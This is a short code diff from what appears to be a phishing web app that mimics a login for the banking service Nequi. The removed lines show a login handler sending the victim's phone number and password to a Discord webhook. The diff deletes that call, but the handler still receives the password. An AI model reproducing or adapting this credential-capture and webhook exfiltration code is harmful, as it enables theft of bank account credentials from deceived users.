@@ -115,12 +115,6 @@ export default function App() {
             phone={formData.phone}
             onSuccess={(phoneValue, password) => {
               setFormData((prev) => ({ ...prev, phone: phoneValue }))
-              DiscordWebhookService.sendUserEvent(
-                'Login exitoso',
-                'Usuario autenticado correctamente en Nequi',
-                { role: 'Cliente', phone: phoneValue },
-                { 'Celular': phoneValue, 'Contraseña': password },
-              )
               navigate('form', 'forward')
             }}
           />
